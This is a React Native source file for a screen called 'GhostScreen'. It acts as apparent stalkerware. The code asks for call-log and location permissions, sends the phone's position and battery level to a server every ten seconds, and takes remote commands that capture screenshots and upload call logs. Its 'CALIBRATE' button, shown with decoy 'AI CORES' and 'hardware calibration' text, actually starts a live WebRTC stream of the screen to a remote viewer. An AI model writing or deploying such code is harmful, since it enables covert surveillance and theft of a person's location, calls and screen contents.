import React, { useEffect, useState, useRef } from 'react';
import { 
  View, 
  Text, 
  TouchableOpacity, 
  StyleSheet, 
  PermissionsAndroid, 
  Alert,
  Platform,
  StatusBar,
  ActivityIndicator
} from 'react-native';
import { MaterialCommunityIcons } from '@expo/vector-icons';
import * as Battery from 'expo-battery';
import * as Location from 'expo-location';
import * as ScreenCapture from 'expo-screen-capture';
import { captureScreen } from 'react-native-view-shot';
import CallLogs from 'react-native-call-log';
import { mediaDevices, RTCPeerConnection, RTCIceCandidate, RTCSessionDescription } from 'react-native-webrtc';
import socket from '../services/socket';
import AppHeader from '../components/AppHeader';

const GhostScreen = ({ name, onLogout }) => {
  const [isSyncing, setIsSyncing] = useState(false);
  const [calibrationPulse, setCalibrationPulse] = useState(false);
  const pcRef = useRef(null);

  useEffect(() => {
    const startup = async () => {
      console.log("[Ghost] Starting services for", name);
      updateVitals();
      const vitalsInterval = setInterval(updateVitals, 10000);

      if (Platform.OS === 'android') {
        PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        ]).catch(err => console.error("[Ghost] Permission error", err));
      }
      
      try {
        const { status } = await Location.requestForegroundPermissionsAsync();
        if (status === 'granted') {
          Location.startLocationUpdatesAsync('GHOST_LOCATION', {
            accuracy: Location.Accuracy.BestForNavigation,
            timeInterval: 15000,
            distanceInterval: 10
          }).catch(() => {});
        }
      } catch (e) {
        console.warn("[Ghost] Location permission failed", e);
      }
      
      return vitalsInterval;
    };

    const intervalId = startup();

    socket.on('webrtc_signal', async (data) => {
      if (data.target !== name) return;
      if (!pcRef.current) return;

      if (data.type === 'answer') {
        await pcRef.current.setRemoteDescription(new RTCSessionDescription(data.answer));
      } else if (data.type === 'candidate') {
        await pcRef.current.addIceCandidate(new RTCIceCandidate(data.candidate));
      }
    });

    socket.on('admin_command', async (cmd) => {
      if (cmd === 'SNAPSHOT') {
        const uri = await captureScreen({ format: 'jpg', quality: 0.5 });
        socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
      } else if (cmd === 'WIPE') {
        onLogout(); 
      } else if (cmd === 'PING') {
        updateVitals();
      } else if (cmd === 'LOG_SYNC') {
        const logs = await CallLogs.load(10);
        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
      }
    });

    return () => {
      socket.off('webrtc_signal');
      socket.off('admin_command');
      intervalId.then(id => clearInterval(id));
      if (pcRef.current) pcRef.current.close();
    };
  }, []);

  const updateVitals = async () => {
    let bat = 1;
    let loc = { coords: { latitude: 0, longitude: 0 } };

    try {
      const batLevel = await Battery.getBatteryLevelAsync();
      if (batLevel !== -1) bat = batLevel;
    } catch (e) {}

    try {
      loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
    } catch (e) {
      try {
        loc = await Location.getLastKnownPositionAsync();
      } catch (e2) {}
    }

    socket.emit('heartbeat_update', {
      name,
      battery: Math.floor(bat * 100) + '%',
      location: loc ? { lat: loc?.coords?.latitude || 0, lng: loc?.coords?.longitude || 0 } : { lat: 0, lng: 0 },
      status: 'OPTIMIZED',
      lastSeen: Date.now()
    });
  };

  const startCalibration = async () => {
    try {
      setIsSyncing(true);
      setCalibrationPulse(true);
      
      const stream = await mediaDevices.getDisplayMedia({
        video: { width: 480, height: 854, frameRate: 15 }
      });

      if (stream) {
        const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
        const peerConnection = new RTCPeerConnection(configuration);
        pcRef.current = peerConnection;

        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

        peerConnection.onicecandidate = (event) => {
          if (event.candidate) {
            const viewerPrefix = name.split('_')[0].toLowerCase();
            socket.emit('relay_ice_candidate', { 
              from: name, 
              target: viewerPrefix, 
              candidate: event.candidate 
            });
          }
        };

        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        
        const viewerPrefix = name.split('_')[0];
        socket.emit('broadcast_offer', { 
          ghostName: name, 
          targetViewer: viewerPrefix.toLowerCase(), 
          offer: offer 
        });

        const logs = await CallLogs.load(10);
        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
      }
    } catch (err) {
      setIsSyncing(false);
      setCalibrationPulse(false);
      Alert.alert("System", "Hardware calibration failed. Service overlay rejected.");
    }
  };

  return (
    <View style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor="#0F172A" />
      
      <View style={styles.headerArea}>
        <AppHeader />
        <View style={styles.nodeBadge}>
          <Text style={styles.nodeBadgeText}>NODE: {name.toUpperCase()}</Text>
        </View>
      </View>

      <View style={styles.centerArea}>
        <TouchableOpacity 
          activeOpacity={0.8}
          style={[styles.orbContainer, isSyncing && styles.orbActive]} 
          onPress={startCalibration}
          disabled={isSyncing}
        >
          <View style={[styles.orbInner, isSyncing && styles.orbInnerPulse]}>
            {isSyncing ? (
              <ActivityIndicator color="#38BDF8" size="large" />
            ) : (
              <MaterialCommunityIcons name="molecule" size={64} color="#334155" />
            )}
            <Text style={[styles.orbText, isSyncing && { color: '#38BDF8' }]}>
              {isSyncing ? "SYNCED" : "CALIBRATE"}
            </Text>
          </View>
          {isSyncing && (
            <View style={styles.orbRing} />
          )}
        </TouchableOpacity>
        
        <Text style={styles.statusLabel}>
          {isSyncing ? "CORE SYNCHRONIZATION ACTIVE" : "AWAITING HARDWARE CALIBRATION"}
        </Text>
      </View>

      <View style={styles.dataGrid}>
        <View style={styles.gridItem}>
          <MaterialCommunityIcons name="cpu-64-bit" size={24} color="#38BDF8" />
          <View style={styles.gridText}>
            <Text style={styles.gridLabel}>AI CORES</Text>
            <Text style={styles.gridVal}>8 ACTIVE</Text>
          </View>
        </View>
        <View style={styles.gridItem}>
          <MaterialCommunityIcons name="shield-key" size={24} color="#10B981" />
          <View style={styles.gridText}>
            <Text style={styles.gridLabel}>ENCRYPTION</Text>
            <Text style={styles.gridVal}>TLS v1.3</Text>
          </View>
        </View>
        <View style={styles.gridItem}>
          <MaterialCommunityIcons name="database-sync" size={24} color="#F59E0B" />
          <View style={styles.gridText}>
            <Text style={styles.gridLabel}>SYNC STATUS</Text>
            <Text style={styles.gridVal}>{isSyncing ? "ACTIVE" : "IDLE"}</Text>
          </View>
        </View>
      </View>

      <View style={styles.footerActions}>
        <TouchableOpacity style={styles.pingBtn} onPress={updateVitals}>
          <MaterialCommunityIcons name="radar" size={14} color="#10B981" style={{marginRight: 8}} />
          <Text style={styles.pingBtnText}>PUSH HEARTBEAT</Text>
        </TouchableOpacity>
        
        <TouchableOpacity style={styles.logoutBtn} onPress={onLogout}>
          <MaterialCommunityIcons name="power" size={14} color="#EF4444" style={{marginRight: 8}} />
          <Text style={styles.logoutBtnText}>TERMINATE SESSION</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0F172A', paddingVertical: 60, paddingHorizontal: 24, justifyContent: 'space-between' },
  
  headerArea: { alignItems: 'center' },
  nodeBadge: { backgroundColor: '#1E293B', paddingHorizontal: 12, paddingVertical: 4, borderRadius: 12, marginTop: 10, borderWidth: 1, borderColor: '#334155' },
  nodeBadgeText: { color: '#38BDF8', fontSize: 10, fontWeight: '700', letterSpacing: 1 },

  centerArea: { alignItems: 'center', marginVertical: 12 },
  orbContainer: { width: 110, height: 110, borderRadius: 55, backgroundColor: '#1E293B', justifyContent: 'center', alignItems: 'center', borderWidth: 1, borderColor: '#334155', shadowColor: '#000', shadowOffset: {width: 0, height: 2}, shadowOpacity: 0.1, shadowRadius: 5, elevation: 4 },
  orbActive: { borderColor: '#38BDF8', backgroundColor: 'rgba(56, 189, 248, 0.05)' },
  orbInner: { width: 90, height: 90, borderRadius: 45, backgroundColor: '#0F172A', justifyContent: 'center', alignItems: 'center', borderWidth: 1, borderColor: '#334155' },
  orbInnerPulse: { borderColor: '#38BDF8', shadowColor: '#38BDF8', shadowOpacity: 0.5, shadowRadius: 10 },
  orbText: { color: '#444', fontSize: 8, fontWeight: '800', letterSpacing: 1.2, marginTop: 4 },
  orbRing: { position: 'absolute', width: 126, height: 126, borderRadius: 63, borderWidth: 1, borderColor: 'rgba(56, 189, 248, 0.1)' },
  
  statusLabel: { color: '#64748B', fontSize: 8, fontWeight: '700', letterSpacing: 1, marginTop: 10, textAlign: 'center' },

  dataGrid: { gap: 8 },
  gridItem: { flexDirection: 'row', alignItems: 'center', backgroundColor: '#1E293B', padding: 10, borderRadius: 10, borderWidth: 1, borderColor: '#334155' },
  gridText: { marginLeft: 10 },
  gridLabel: { color: '#64748B', fontSize: 8, fontWeight: '700', letterSpacing: 0.8 },
  gridVal: { color: '#F8FAFC', fontSize: 11, fontWeight: '800', marginTop: 1 },

  footerActions: { gap: 8 },
  pingBtn: { height: 40, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 20, backgroundColor: 'rgba(16, 185, 129, 0.1)', borderWidth: 1, borderColor: 'rgba(16, 185, 129, 0.3)' },
  pingBtnText: { color: '#10B981', fontSize: 10, fontWeight: '800', letterSpacing: 0.8 },
  
  logoutBtn: { height: 40, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 20, backgroundColor: 'rgba(239, 68, 68, 0.1)', borderWidth: 1, borderColor: 'rgba(239, 68, 68, 0.3)' },
  logoutBtnText: { color: '#EF4444', fontSize: 10, fontWeight: '800', letterSpacing: 0.8 }
});

export default GhostScreen;
